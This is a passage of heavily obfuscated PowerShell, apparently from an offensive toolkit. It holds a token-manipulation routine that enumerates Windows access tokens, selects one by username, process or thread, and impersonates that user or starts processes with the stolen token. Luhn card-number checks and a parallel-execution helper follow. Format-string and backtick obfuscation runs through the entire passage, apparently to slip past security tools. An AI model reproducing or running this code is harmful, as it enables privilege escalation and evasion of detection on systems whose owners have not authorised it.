            &("{1}{2}{3}{0}"-f'se','Writ','e-V','erbo') (("{10}{21}{17}{8}{13}{16}{4}{11}{19}{2}{3}{12}{6}{1}{7}{14}{15}{9}{0}{5}{20}{18}"-f' have ',' in Ses','r','o','in','a ','sses','sion 0','ion 0','ot','R','g NoU','ce',', f',' ','cann','orc','n Sess',')','I (p','UI','unning i'))
            ${N`oUI} = ${TR`UE}
        }

        if (${pSc`MD`LET}.ParAmETeRsETnamE -ieq ("{0}{1}{2}" -f'Rev','T','oSelf'))
        {
            &("{4}{1}{2}{0}{3}" -f 'S','er','tTo','elf','Invoke-Rev') -ShowOutput
        }
        elseif (${P`sc`mDleT}.ParAmeterseTnAmE -ieq ("{1}{2}{0}{3}"-f 'roc','Create','P','ess') -or ${ps`Cm`DlET}.PaRamETErSetnamE -ieq ("{1}{2}{3}{0}{4}"-f'ersonateUs','I','m','p','er'))
        {
            ${a`ll`TOK`enS} = &("{1}{0}{3}{2}{4}"-f'num-Al','E','e','lTok','ns')
            
            
            [IntPtr]${h`T`OKEN} =   $b8F4i::"ze`RO"
            ${u`NIq`UETOkenS} = (&("{1}{3}{2}{0}" -f'okens','Ge','iqueT','t-Un') -AllTokens ${AL`LT`oK`ENS})."tokENb`y`User"
            if (${uSE`RN`AmE} -ne ${nU`ll} -and ${Use`RName} -ne '')
            {
                if (${unI`QU`etokENs}.("{0}{1}{3}{2}" -f 'C','ontai','ey','nsK').Invoke(${us`eRNaMe}))
                {
                    ${HtO`Ken} = ${uNIqU`Eto`KE`NS}[${uSe`RN`AMe}]."HTo`k`EN"
                    &("{1}{2}{0}" -f 'ite-Verbose','W','r') ("{2}{4}{5}{6}{3}{0}{1}" -f 'r','name','Selectin','y use','g t','oken',' b')
                }
                else
                {
                    &("{3}{2}{0}{1}" -f'ro','r','te-Er','Wri') "A token belonging to the specified username was not found. Username: $($Username) " -ErrorAction ("{0}{1}"-f'S','top')
                }
            }
            elseif ( ${pR`ocESs`id} -ne ${nU`lL} -and ${Pr`O`CesSId} -ne 0)
            {
                foreach (${T`Ok`EN} in ${a`lLtoK`Ens})
                {
                    if ((${To`ken} | &("{0}{1}{2}"-f 'Get-Mem','be','r') ("{0}{1}"-f 'Proces','sId')) -and ${TO`KeN}."PRo`cESSiD" -eq ${P`RO`CessId})
                    {
                        ${HT`oken} = ${to`kEN}."hTo`kEn"
                        &("{1}{3}{2}{0}" -f'bose','W','ite-Ver','r') ("{3}{0}{2}{4}{1}"-f'ting token','D',' by P','Selec','rocessI')
                    }
                }

                if (${ht`o`kEn} -eq   (  GET-VARiABle b8F4I -VALUeOnly)::"Z`ero")
                {
                    &("{0}{3}{1}{2}" -f'W','ite-Er','ror','r') "A token belonging to ProcessId $($ProcessId) could not be found. Either the process doesn't exist or it is a protected process and cannot be opened. " -ErrorAction ("{1}{0}" -f 'op','St')
                }
            }
            elseif (${t`HR`EADiD} -ne ${n`UlL} -and ${T`hreAdiD} -ne 0)
            {
                foreach (${T`OkeN} in ${AlLTo`K`eNS})
                {
                    if ((${t`okEN} | &("{1}{0}{2}"-f'm','Get-Me','ber') ("{2}{0}{1}"-f 'hread','Id','T')) -and ${To`Ken}."tHRE`A`DId" -eq ${th`Re`ADID})
                    {
                        ${H`T`okEN} = ${T`OKEN}."HtO`KEn"
                        &("{0}{2}{1}"-f 'Wr','se','ite-Verbo') ("{1}{0}{2}{3}{6}{4}{5}"-f 'le','Se','ct','ing ','b','y ThreadId','token ')
                    }
                }

                if (${H`TOK`EN} -eq  (  get-variABlE B8f4I).VaLUe::"Z`ErO")
                {
                    &("{2}{1}{0}" -f'Error','rite-','W') "A token belonging to ThreadId $($ThreadId) could not be found. Either the thread doesn't exist or the thread is in a protected process and cannot be opened. " -ErrorAction ("{0}{1}"-f 'St','op')
                }
            }
            elseif (${p`R`oCeSs} -ne ${Nu`LL})
            {
                foreach (${tO`k`EN} in ${ALL`T`OK`eNS})
                {
                    if ((${t`o`KEn} | &("{2}{1}{0}"-f'ber','t-Mem','Ge') ("{1}{2}{3}{0}" -f 'Id','P','r','ocess')) -and ${tO`k`en}."pROC`esS`iD" -eq ${p`R`OCESs}."id")
                    {
                        ${HTO`kEN} = ${T`okeN}."HT`Oken"

                        if(${i`NST`AncE}){
                            &("{2}{3}{1}{4}{0}"-f 'Verbose','e','Wri','t','-') ("$Instance "+': '+'Sel'+'ectin'+'g '+'to'+'ken '+'b'+'y '+'Proce'+'s'+'s '+'objec'+'t')
                        }else{
                            &("{0}{2}{1}"-f'Writ','-Verbose','e') ("{2}{0}{7}{5}{4}{1}{6}{3}"-f 'cting to','roces','Sele','ject','P','y ','s ob','ken b')
                        }
                    }
                }

                if (${h`TokEN} -eq   (Get-ItEm  VarIAbLe:B8F4i).VALUE::"zE`RO")
                {
                    &("{3}{2}{0}{1}"-f 'Erro','r','rite-','W') "A token belonging to Process $($Process.Name) ProcessId $($Process.Id) could not be found. Either the process doesn't exist or it is a protected process and cannot be opened. " -ErrorAction ("{0}{1}" -f 'St','op')
                }
            }
            else
            {
                &("{2}{0}{1}"-f'rro','r','Write-E') ("{3}{4}{8}{7}{0}{1}{9}{5}{2}{6}"-f'name, P','r','ob','Mu','st sup','d, ThreadId, or Process ','ject','y a User','pl','ocessI')  -ErrorAction ("{1}{0}"-f'p','Sto')
            }

            
            if (${P`scmd`LET}.pARaMeTeRseTNAME -ieq ("{4}{2}{3}{0}{1}" -f 'Proces','s','e','ate','Cr'))
            {
                if (-not ${n`ouI})
                {
                    &("{2}{0}{1}{3}" -f'k','top','Set-Des','ACLs')
                }

                &("{6}{4}{1}{3}{0}{2}{5}" -f 'hTok','sWi','e','t','ces','n','Create-Pro') -hToken ${H`TokeN} -ProcessName ${C`ReaTe`pr`oc`ESs} -ProcessArgs ${P`ROCeS`sA`RGs} -PassThru:${P`A`SsTh`RU}

                &("{4}{3}{2}{1}{0}{5}" -f 'ev','R','ke-','nvo','I','ertToSelf')
            }
            elseif (${I`Mpe`RSOnAteUS`ER})
            {
                &("{2}{1}{0}{4}{3}"-f 'mperson','ke-I','Invo','r','ateUse') -hToken ${hTOk`eN} | &("{0}{1}" -f 'Out-N','ull')
                &("{1}{3}{2}{0}" -f'st','Wr','e-Ho','it') "Running As: $([Environment]::UserDomainName)\$([Environment]::UserName) "
            }

            &("{1}{0}{2}{3}"-f'-AllToke','Free','n','s') -TokenInfoObjs ${AlL`TOKE`Ns}
        }
        elseif (${PS`cMD`LeT}.PaRameTErsETNaME -ieq ("{0}{1}" -f'WhoA','mI'))
        {
            &("{0}{1}{2}" -f'Writ','e-H','ost') "$([Environment]::UserDomainName)\$([Environment]::UserName)"
        }
        else 
        {
            ${a`llt`OkEnS} = &("{3}{1}{2}{0}"-f 's','Tok','en','Enum-All')

            if (${p`SCmdl`Et}.ParAmetErsetNAme -ieq ("{0}{1}"-f 'Show','All'))
            {
                &("{2}{0}{1}"-f '-Ho','st','Write') ${aL`lTOKE`NS}
            }
            else
            {
                &("{2}{1}{0}"-f'st','e-Ho','Writ') (&("{4}{0}{3}{1}{2}"-f '-Uni','u','eTokens','q','Get') -AllTokens ${A`l`LTOkEnS})."TO`kENBy`UsER"."Va`LUeS"
            }

            &("{2}{5}{1}{4}{3}{0}"-f'oSelf','e','Invoke-','tT','r','Rev')

            &("{2}{1}{3}{0}" -f 'ns','ree-','F','AllToke') -TokenInfoObjs ${a`l`l`TOKeNS}
        }
    }


    
    &("{0}{1}"-f 'Mai','n')
}







function T`e`ST`-ISlUHNvAlid
{
    
    [CmdletBinding()]
    param (
        [Parameter(mANDaTORY = ${T`RuE}, PoSitioN = 0, vALuEFRompIpELine = ${T`RUe})]
        [uint64]${n`UM`BEr}
    )

    ${Num`BeRDig`i`TS} = &("{4}{1}{2}{3}{5}{0}" -f 'ts','ve','rt','To','Con','-Digi') -Number ${n`UMber}
    ${c`HeCK`s`UmDiG`it} = ${n`UMBe`RdIG`ITS}[-1]
    ${NumbEr`WItH`oUTchEc`k`sUm`DIgiT} = ${NU`M`B`er`dIgITS}[0..(${nUMbeRd`IG`i`Ts}."Cou`NT" - 2)] -join ''
    ${C`hEc`ksum} = &("{1}{3}{0}{5}{4}{2}"-f 'Lu','Ge','CheckSum','t-','n','h') -Number ${Num`Berw`itHOutc`hE`c`Ks`U`MdigIT}
    ${nuMcO`U`NT} = ([string]${numbEr`wi`T`hO`UTc`HeCKsU`mDiGiT})."Le`Ngth"

    if (((${cH`e`cKSUM} + ${c`H`Ecksu`Mdig`it}) % 10) -eq 0 -and ${n`Um`COuNT} -ge 12)
    {
        &("{1}{0}{2}"-f'rit','W','e-Host') -InputObject ${Tr`Ue}
    }
    else
    {
        &("{2}{0}{1}"-f'te','-Host','Wri') -InputObject ${F`Alse}
    }
}







function Co`NVErtt`O-`DigITS
{
    
    [OutputType([System.Byte[]])]
    [CmdletBinding()]
    param(
        [Parameter(PosItION = 0, MANDaTOry = ${t`RUe}, VALUEFROmPipElInE = ${tr`Ue})]
        [uint64]${NuM`B`Er}
    )
    ${N} = ${nU`m`BeR}
    ${N`U`mBerOfD`I`GiTs} = 1 +  (VaRiaBlE  ('Q'+'MRK')  -val)::"tOu`iN`T64"( (gET-vARIaBle ("gmuy"+"P")  ).vALue::"F`lOor"(( $gmUyP::("{0}{1}" -f 'Log1','0').Invoke(${n}))))
    ${DI`g`ItS} = &("{1}{0}{2}"-f'ec','New-Obj','t') -TypeName ("{0}{1}"-f'Byt','e[]') -ArgumentList ${n`Um`Be`Rof`dIGIts}
    for (${I} = (${n`Um`BEROFdI`gI`TS} - 1); ${i} -ge 0; ${i}--)
    {
        ${D`igIt} = ${N} % 10
        ${dIgi`Ts}[${I}] = ${d`I`gIt}
        ${n} =  ( ls ('V'+'ARiAbL'+'e:g'+'mUyp')  ).VaLUE::("{0}{1}" -f'F','loor').Invoke(${n} / 10)
    }
    &("{0}{1}{2}" -f'W','r','ite-Host') -InputObject ${d`igI`TS}
}








function I`Nvok`e-PARALL`EL
{
    
    [cmdletbinding(DEfAultParamEterSetNAME = {"{1}{0}{2}" -f 'cript','S','Block'})]
    Param (
        [Parameter(ManDatoRY = ${F`AL`sE},pOSiTiOn = 0,pAraMETeRsETNaMe = "sc`Ri`ptB`lOCK")]
        [System.Management.Automation.ScriptBlock]${S`cri`pTBLoCK},

        [Parameter(mAnDAtory = ${fA`Lse},parAMeTeRSeTname = "sC`RI`ptf`Ile")]
        [ValidateScript({
                    &("{0}{1}" -f'Tes','t-Path') ${_} -PathType ("{1}{0}" -f 'af','le')
        })]
        ${s`cri`PtfILE},

        [Parameter(maNdAtory = ${T`RuE},VAlUefRomPIPELIne = ${TR`UE})]
        [Alias('CN',{"{1}{0}"-f'erver','__S'},{"{1}{2}{0}" -f's','I','PAddres'},{"{1}{0}" -f'r','Serve'},{"{1}{2}{0}" -f 'erName','Compu','t'})]
        [PSObject]${INpu`TObj`eCt},

        [PSObject]${paR`AME`Ter},

        [switch]${I`MpoRTSEssIOnfUn`CT`io`Ns},

        [switch]${ImPortV`ArIAb`Les},

        [switch]${IMP`oRt`MOD`UL`Es},

        [int]${Thr`oT`T`Le} = 20,

        [int]${SlE`epTI`m`Er} = 200,

        [int]${R`UN`spACETiM`eo`Ut} = 0,

        [switch]${NOClo`SEOn`TI`ME`oUt} = ${fA`lSe},

        [int]${m`Axq`Ue`UE},

        [validatescript({
                    &("{0}{1}"-f 'Test','-Path') (&("{2}{3}{1}{0}"-f 'Path','-','S','plit') -Path ${_} -Parent)
        })]
        [string]${L`oGF`iLe} = ((("{2}{1}{3}{0}" -f 'kolog.log',':F','C','kotempF'))."Rep`LaCE"('Fko',[sTRiNg][chAr]92)),

        [switch] ${q`U`iet} = ${FAl`Se}
    )

    Begin {

        
        
        if( -not ${pSbOUNd`PAr`AME`TeRs}.("{1}{0}{2}" -f 'tains','Con','Key').Invoke(("{0}{1}{2}"-f 'Max','Qu','eue')) )
        {
            if(${RUnS`p`ACET`i`ME`OUt} -ne 0)
            {
                ${s`cRiPt`:maX`quEuE} = ${th`RoT`TlE}
            }
            else
            {
                ${S`CRi`Pt:`mAxQuEUe} = ${tHrOT`T`lE} * 3
            }
        }
        else
        {
            ${sC`RI`p`T:MAxQue`UE} = ${mA`xQUEUE}
        }

        

        
        if (${IMport`V`Ar`IAblES} -or ${impo`RtMOdu`LES})
        {
            ${sT`AND`ArdUsErE`Nv} =   $LNz5F::("{0}{1}" -f'Cre','ate').Invoke().("{1}{0}" -f'ript','addsc').Invoke({
                    
                    ${m`oDuLes} = &("{0}{2}{3}{1}"-f'G','odule','et-','M') | &("{1}{2}{0}" -f'-Object','Selec','t') -ExpandProperty ("{0}{1}"-f 'Nam','e')
                    ${S`NAp`iNs} = &("{1}{3}{2}{0}"-f 'in','Ge','Snap','t-PS') | &("{0}{2}{3}{1}"-f'Selec','ect','t-Ob','j') -ExpandProperty ("{0}{1}"-f'Na','me')

                    
                    
                    ${VaR`Ia`BLes} = &("{0}{1}{2}"-f'Get-Va','riabl','e') | &("{1}{0}{2}{3}" -f 'elect-Obj','S','ec','t') -ExpandProperty ("{0}{1}" -f'N','ame')

                    
                    @{
                        ("{0}{2}{1}"-f'Var','les','iab') = ${vARIa`B`LeS}
                        ("{0}{1}{2}" -f'Mo','dul','es')   = ${mOD`UL`Es}
                        ("{1}{0}"-f 'ins','Snap')   = ${S`NaP`InS}
                    }
            })."inv`O`KE"()[0]

            if (${i`MpO`RtVa`RiABL`es})
            {
                
                Function _T`eMP
                {
                    [cmdletbinding()] param()
                }
                ${VA`RiAb`L`eStoeXcL`UDE} = @( (&("{1}{2}{0}" -f'd','Get-C','omman') ("{1}{0}"-f 'p','_tem') | &("{1}{0}{2}"-f't-Ob','Selec','ject') -ExpandProperty ("{2}{0}{1}"-f 'e','rs','paramet'))."K`EyS" + ${ps`Boun`dpaRAM`eTeRS}."ke`ys" + ${stanDAR`d`U`SerE`NV}."vAR`IableS" )
                

                
                
                
                
                ${U`ServArI`ABles} = @( &("{2}{0}{1}"-f 't-Variabl','e','Ge') | &("{0}{3}{1}{2}"-f'Wh','re-Objec','t','e') -FilterScript {
                        -not (${v`A`RIaBleSt`oEXCluDe} -contains ${_}."n`AME")
                } )
                
            }

            if (${Imp`OrTModu`l`ES})
            {
                ${USeRM`o`d`Ules} = @( &("{0}{2}{1}"-f'Get-M','dule','o') |
                    &("{2}{0}{1}" -f'e-Objec','t','Wher') -FilterScript {
                        ${S`TANDa`R`DuSerENV}."M`ODuL`ES" -notcontains ${_}."na`ME" -and (&("{1}{0}{2}" -f'est-Pa','T','th') -Path ${_}."P`AtH" -ErrorAction ("{2}{1}{0}" -f'lyContinue','nt','Sile'))
                    } |
                &("{3}{0}{2}{1}"-f'Obj','t','ec','Select-') -ExpandProperty ("{0}{1}"-f'P','ath') )
                ${Us`ERSnAPI`NS} = @( &("{0}{1}{2}" -f'G','et-PS','Snapin') |
                    &("{1}{2}{0}" -f 'ct-Object','Sel','e') -ExpandProperty ("{0}{1}" -f'Na','me') |
                    &("{0}{2}{1}" -f'Wh','re-Object','e') -FilterScript {
                        ${St`AnDAR`d`U`ser`eNv}."sNaP`InS" -notcontains ${_}
                } )
            }
        }

        

        Function gE`T-rUn`SPAce`DaTA
        {
            [cmdletbinding()]
            param( [switch]${wA`it} )

            
            
            Do
            {
                
                ${M`Ore} = ${f`A`lse}

                
                if (-not ${Q`Uiet})
                {
                    &("{3}{0}{1}{2}"-f'ite','-Progre','ss','Wr')  -Activity ("{1}{0}{2}{3}"-f'ing Qu','Runn','er','y') -Status ("{1}{3}{4}{2}{0}"-f 'ds','St','hrea','arting',' t')`
                    -CurrentOperation ("$startedCount "+'threads'+' '+'d'+'e'+'fined '+'- '+"$totalCount "+'inpu'+'t '+'objec'+'ts '+'- '+"$script:completedCount "+'in'+'put'+' '+'o'+'bje'+'cts '+'p'+'rocess'+'e'+'d')`
                    -PercentComplete $( Try
                        {
                            ${sCR`iPt:comP`LetEDCOU`Nt} / ${ToTA`Lc`OUNt} * 100
                        }
                        Catch
                        {
                            0
                        }
                    )
                }

                
                Foreach(${ru`NSP`Ace} in ${r`U`NSPaCES})
                {
                    
                    ${cUR`R`eNT`DaTE} = &("{1}{2}{0}" -f'te','Get','-Da')
                    ${R`Un`TIME} = ${cUR`RE`NTDaTE} - ${rUns`P`ACe}."s`TAR`TTIme"
                    ${ru`NMiN} =  $GmUyp::("{1}{0}"-f 'd','Roun').Invoke( ${ruN`T`IME}."tOTA`L`min`UtEs" ,2 )

                    
                    ${l`oG} = '' | &("{3}{2}{0}{1}" -f 'Obj','ect','t-','Selec') -Property ("{1}{0}" -f 'ate','D'), ("{2}{1}{0}" -f'n','ctio','A'), ("{1}{0}"-f'me','Runti'), ("{0}{1}"-f 'Statu','s'), ("{0}{1}" -f 'Deta','ils')
                    ${L`og}."aC`Tion" = "Removing:'$($runspace.object)'"
                    ${L`OG}."da`TE" = ${C`UrReN`Td`ATe}
                    ${l`Og}."Ru`Nt`ime" = ("$runMin "+'min'+'ute'+'s')

                    
                    If (${r`UNS`PA`cE}."rU`NSp`AcE"."I`SCOM`Pl`ETEd")
                    {
                        ${Sc`Ri`PT:cO`mPLEteDCoU`Nt}++

                        
                        if(${r`U`NspaCe}."P`oWeR`SHE`lL"."st`REAMS"."Er`Ror"."coU`Nt" -gt 0)
                        {
                            
                            ${L`OG}."STat`US" = ("{0}{2}{3}{1}{4}" -f 'C','edWi','omp','let','thErrors')
                            
                            foreach(${E`RR`ORrE`cOrd} in ${Ru`Nsp`AcE}."poWErs`hE`Ll"."STR`E`AMs"."ERR`OR")
                            {
                                &("{2}{1}{0}" -f'-Error','te','Wri') -ErrorRecord ${Er`Rorr`Ec`ORD}
                            }
                        }
                        else
                        {
                            
                            ${l`og}."Sta`TuS" = ("{0}{2}{1}"-f'Co','d','mplete')
                            
                        }

                        
                        ${rU`NSP`AcE}."P`OWerShe`ll".("{0}{1}"-f'EndIn','voke').Invoke(${RU`Nsp`AcE}."R`U`NsPaCe")
                        ${Ru`N`SP`AcE}."PoWe`Rsh`E`ll".("{0}{1}"-f 'disp','ose').Invoke()
                        ${RunS`PACE}."R`UnSpa`ce" = ${n`ULL}
                        ${Run`sP`Ace}."p`o`wE`RshEll" = ${N`UlL}
                    }

                    
                    ElseIf ( ${RU`N`SPa`CEtiMEo`UT} -ne 0 -and ${r`Unt`Ime}."T`OtAlSECO`N`dS" -gt ${ruN`SPACeTi`Me`ouT})
                    {
                        ${SCRIpT:C`ompl`etedCo`U`NT}++
                        ${tiM`eDOU`Tt`ASkS} = ${t`RUe}

                        
                        ${L`oG}."ST`ATUS" = ("{2}{1}{0}"-f'Out','med','Ti')
                        
                        &("{1}{3}{0}{2}" -f 'ro','Write-','r','Er') -Message "Runspace timed out at $($runtime.totalseconds) seconds for the object:`n$($runspace.object | Out-String) "

                        
                        if (!${nOcl`Oseonti`M`E`out})
                        {
                            ${RUn`sP`ACE}."pOwe`RSH`e`ll".("{0}{2}{1}"-f 'disp','se','o').Invoke()
                        }
                        ${rUNs`p`ACe}."ru`NSPA`Ce" = ${nu`LL}
                        ${r`U`NspAce}."PowEr`s`HELL" = ${NU`Ll}
                        ${COMpL`EtEd`cO`UNt}++
                    }

                    
                    ElseIf (${R`Uns`PacE}."rUN`Spa`ce" -ne ${n`ULL} )
                    {
                        ${l`OG} = ${N`UlL}
                        ${M`oRE} = ${Tr`Ue}
                    }

                    
                    
                }

                
                ${TE`M`PHaSH} = ${ru`Nsp`ACEs}.("{1}{0}"-f 'one','cl').Invoke()
                ${teMPH`AsH} |
                &("{3}{1}{2}{0}"-f'ect','-','Obj','Where') -FilterScript {
                    ${_}."ru`NspACE" -eq ${Nu`lL}
                } |
                &("{1}{3}{2}{0}"-f 'ct','ForEach-O','e','bj') -Process {
                    ${r`UNS`pACeS}.("{0}{1}"-f'remov','e').Invoke(${_})
                }

                
                if(${PSb`OuNdpar`AM`etErS}[("{1}{0}" -f 'ait','W')])
                {
                    &("{0}{1}{2}{3}" -f 'S','tart-Sl','e','ep') -Milliseconds ${SLEE`pTi`MeR}
                }

                
            }
            while (${MO`Re} -and ${p`sBOUnd`PaRAme`TErs}[("{1}{0}" -f't','Wai')])

            
        }

        

        

        if(${PsC`MD`l`ET}.paraMETErSETNAme -eq ("{1}{2}{0}"-f'iptFile','S','cr'))
        {
            ${scr`iPtb`lo`CK} =   $4iuaw::("{0}{1}"-f 'Cre','ate').Invoke( $(&("{2}{0}{1}" -f'et-Con','tent','G') ${SC`Ri`p`TFIlE} | &("{0}{2}{1}"-f 'O','String','ut-')) )
        }
        elseif(${psCm`DL`et}.pARaMetErSetNAme -eq ("{3}{1}{0}{2}" -f 'Bloc','cript','k','S'))
        {
            
            [string[]]${p`ARAMs`TO`ADD} = '$_'
            if( ${pSb`oU`NDp`ARAm`ETERs}.("{0}{2}{1}"-f'C','ainsKey','ont').Invoke(("{1}{0}{2}"-f 'ete','Param','r')) )
            {
                ${Pa`Rams`ToADd} += (('{0'+'}'+'Par'+'ame'+'ter')-f  [chaR]36)
            }

            ${US`i`NGVa`RIA`Bl`eData} = ${NU`ll}


            
            

            if(${p`S`VeRsiONtA`Ble}."pS`VerSi`On"."MA`jOr" -gt 2)
            {
                
                ${USin`Gva`R`iAb`LeS} = ${sCRiPT`BlO`ck}."a`st"."f`IN`DAll"({
                        ${AR`gS}[0] -is [System.Management.Automation.Language.UsingExpressionAst]
                },${Tr`UE})

                If (${us`In`g`VaRIAb`LEs})
                {
                    ${l`iST} = &("{0}{1}{2}" -f'Ne','w-Objec','t') -TypeName ((('Syst'+'em.Collecti'+'ons.'+'Gener'+'i'+'c.ListT'+'q'+'a'+'1[S'+'ys'+'t'+'em'+'.Managemen'+'t'+'.Automation.La'+'ngu'+'ag'+'e.VariableE'+'xpres'+'sionAst]')  -crePlacE  ([char]84+[char]113+[char]97),[char]96))
                    ForEach (${a`st} in ${usi`N`Gv`AR`IaBLeS})
                    {
                        [void]${l`iSt}.("{1}{0}" -f'dd','A').Invoke(${a`St}."s`UbeX`preSSi`on")
                    }

                    ${U`SINg`V`Ar} = ${usINGv`Ar`iA`BLeS} |
                    &("{1}{3}{0}{2}" -f 'oup-','G','Object','r') -Property ("{1}{3}{0}{2}"-f 'press','Su','ion','bEx') |
                    &("{0}{2}{3}{1}{4}"-f 'Fo','c','rEa','ch-Obje','t') -Process {
                        ${_}."G`ROUp" |
                        &("{1}{2}{0}"-f '-Object','S','elect') -First 1
                    }

                    
                    ${uSin`gv`ARi`A`BL`eDAta} = ForEach (${v`Ar} in ${U`sING`Var})
                    {
                        Try
                        {
                            ${Va`LUe} = &("{1}{2}{0}{3}" -f'ar','Ge','t-V','iable') -Name ${V`AR}."SuBeXpress`I`on"."V`Ari`AbL`ePaTH"."us`er`PATh" -ErrorAction ("{1}{0}" -f 'p','Sto')
                            [pscustomobject]@{
                                ("{1}{0}" -f'ame','N')       = ${V`AR}."s`UBEXprE`ss`iOn"."Exte`Nt"."T`exT"
                                ("{1}{0}"-f 'e','Valu')      = ${V`A`LUe}."Va`lUE"
                                ("{1}{0}" -f'me','NewNa')    = ('$__using_{0}' -f ${V`AR}."sU`B`eXpr`EsS`ion"."VARi`Able`P`ATh"."use`R`PATh")
                                ("{1}{2}{0}" -f'arName','Ne','wV') = ('__using_{0}' -f ${v`AR}."SU`B`eXPREssI`on"."var`i`ABl`ePATh"."UsEr`P`ATH")
                            }
                        }
                        Catch
                        {
                            &("{3}{2}{0}{1}" -f 'ro','r','te-Er','Wri') -Message "$($Var.SubExpression.Extent.Text) is not a valid Using: variable! "
                        }
                    }
                    ${par`A`MsToaDD} += ${uSingVAriA`B`l`edAtA} | &("{2}{1}{0}"-f 'ct-Object','le','Se') -ExpandProperty ("{1}{0}"-f'wName','Ne') -Unique

                    ${N`e`WpArA`MS} = ${U`sinG`VAR`IabLE`DAta}."nEWN`Ame" -join ', '
                    ${T`UP`le} =   (  vARIAble  cwTMr  ).vaLuE::("{1}{0}" -f'ate','Cre').Invoke(${Li`ST}, ${Ne`wpAra`MS})
                    ${b`inDI`NgFl`AGS} = [Reflection.BindingFlags]("{3}{7}{5}{4}{0}{8}{6}{2}{1}"-f 'b','ce','an','Defa','Pu',',Non','nst','ult','lic,I')
                    ${G`ETwiTHinP`UThaNdLINgfo`R`i`N`Vo`kE`cOMmandiM`PL} = (${scRipTBL`o`CK}."A`St".("{1}{0}"-f'ettype','g').Invoke().("{0}{1}" -f'Ge','tMethod').Invoke(("{0}{1}{3}{8}{6}{2}{4}{5}{7}"-f'Ge','tW','For','ithI','Invo','keCom','ng','mandImpl','nputHandli'),${bIn`DiN`GFlagS}))

                    ${s`TRi`N`gscrIPt`BLo`Ck} = ${gE`T`Wi`ThiNp`Ut`HANdlInGFoRI`N`VO`keCo`m`mAndim`pl}."I`NV`Oke"(${scRIpt`BL`ocK}."a`St",@(${T`Up`LE}))

                    ${sCRip`Tb`lOck} =   ( vaRIAblE  4IuaW -VAlUeon)::("{1}{2}{0}"-f 'te','Cr','ea').Invoke(${strI`NGSCRi`p`T`BLo`ck})

                    
                }
            }

            ${S`crIpTBL`o`ck} = ${E`xe`cut`IOnConte`Xt}."iNVokEC`omma`ND".("{4}{1}{0}{3}{2}"-f 't','wScrip','ock','Bl','Ne').Invoke("param($($ParamsToAdd -Join ', '))`r`n " + ${S`Cr`ipTblO`Ck}.("{0}{1}" -f 'ToStri','ng').Invoke())
        }
        else
        {
            Throw ("{5}{3}{4}{7}{6}{0}{10}{8}{1}{2}{11}{9}" -f 'Sc','loc','k or Sc','us','t','M',' ',' provide','B','le','ript','riptFi')
            Break
        }

        &("{1}{2}{0}"-f'g','W','rite-Debu') -Message "`$ScriptBlock: $($ScriptBlock | Out-String) "
        If (-not(${s`U`Pp`RE`ssvErBoSE})){
            &("{0}{1}{3}{2}"-f 'W','rite','Verbose','-') -Message ("{4}{1}{8}{7}{3}{9}{2}{6}{0}{10}{5}"-f 'e','ng run','nd','a','Creati','ates',' s','p','s','ce pool a','ssion st')
        }


        
        ${SesSIOnst`A`Te} =   $Q01FpM::("{2}{3}{1}{0}"-f'ault','Def','Cr','eate').Invoke()
        if (${ImP`OR`TVa`RIA`BleS})
        {
            if(${US`eRV`AriaBles}."cO`Unt" -gt 0)
            {
                foreach(${v`ARiAb`le} in ${usER`Va`RIa`BlEs})
                {
                    ${S`E`ssIO`Nst`Ate}."VA`Ri`AbLES".("{1}{0}" -f'd','Ad').Invoke( (&("{0}{1}{2}"-f 'Ne','w','-Object') -TypeName ("{4}{7}{11}{3}{5}{1}{6}{12}{0}{2}{9}{10}{8}" -f'essio','.Auto','nStateVari','nagem','Sy','ent','mat','s','try','abl','eEn','tem.Ma','ion.Runspaces.S') -ArgumentList ${vARiA`BlE}."na`me", ${V`Ar`IA`Ble}."V`ALUE", ${N`Ull}) )
                }
            }
        }
        if (${Im`pOr`T`mo`DuLEs})
        {
            if(${UsErm`od`UlEs}."C`Ount" -gt 0)
            {
                foreach(${mOdU`LE`p`Ath} in ${U`s`Erm`ODULes})
                {
                    ${S`ES`sIo`N`sTATe}.("{1}{0}{2}{3}" -f 'mportPS','I','Modu','le').Invoke(${MOd`U`LEPaTh})
                }
            }
            if(${U`S`ERSNAP`iNS}."C`ounT" -gt 0)
            {
                foreach(${ps`sNa`PiN} in ${u`serS`NAPI`Ns})
                {
                    [void]${S`e`SsI`oNStAtE}."iMP`or`TpsSN`APin"(${psS`NAP`in}, [ref]${nU`ll})
                }
            }
        }

        
        
        
        

        if(${ImP`O`RTsessiO`N`Fu`NCTioNs})
        {
            
            &("{1}{0}{2}" -f 'd','Get-Chil','Item') -Path (("{1}{2}{0}" -f'n:xMk','Fun','ctio'))."Re`PL`Ace"(([chAR]120+[chAR]77+[chAR]107),'\') |
            &("{0}{1}{2}" -f'Wh','ere-O','bject') -FilterScript {
                ${_}."na`me" -notlike '*:*'
            } |
            &("{0}{2}{1}" -f 'S','ct','elect-Obje') -Property ("{1}{0}"-f 'ame','n') -ExpandProperty ("{0}{1}" -f'n','ame') |
            &("{0}{2}{4}{1}{3}"-f 'F','-O','o','bject','rEach') -Process {
                
                ${DeFI`N`ITION} = &("{2}{1}{3}{0}"-f'ent','-Con','Get','t') -Path "function:\$_" -ErrorAction ("{1}{0}" -f'top','S')

                
                ${Se`sSioN`stATe`FU`N`ct`iOn} = &("{3}{1}{0}{2}"-f 'e','w-Obj','ct','Ne') -TypeName ("{11}{7}{8}{1}{6}{10}{4}{3}{2}{0}{5}{12}{9}"-f 's','n','Ses','paces.','Runs','ionStateF','t.Autom','em.Ma','nageme','ry','ation.','Syst','unctionEnt') -ArgumentList "$_", ${dE`FI`Ni`TIOn}

                
                ${SEs`Si`O`NsTaTE}."co`MMa`NDs".("{1}{0}"-f 'dd','A').Invoke(${Sessi`on`state`Fun`C`Ti`ON})
            }
        }
        

        
        ${Ru`Ns`P`ACE`POOL} =  (  gcI vaRiabLe:OSV1K ).VAlue::("{3}{1}{2}{4}{0}" -f'ol','ateRun','spa','Cre','cePo').Invoke(1, ${THR`otTLE}, ${s`ESsI`oNsT`A`Te}, ${hO`sT})
        ${r`U`N`SpaCEPoOL}.("{0}{1}"-f 'Ope','n').Invoke()

        
        ${ScRi`P`T`:Run`SP`ACes} = &("{0}{2}{1}" -f'New-Obj','ct','e') -TypeName ("{0}{6}{4}{5}{8}{3}{2}{7}{1}" -f 'S','t','ayLi','r','m.','Collect','yste','s','ions.Ar')

        
        ${Bou`ND} = ${pS`B`OUNdPArA`mEterS}."kE`yS" -contains ("{3}{2}{1}{0}"-f'utObject','p','n','I')
        if(-not ${Bou`ND})
        {
            [System.Collections.ArrayList]${Al`LobJ`ECts} = @()
        }

        
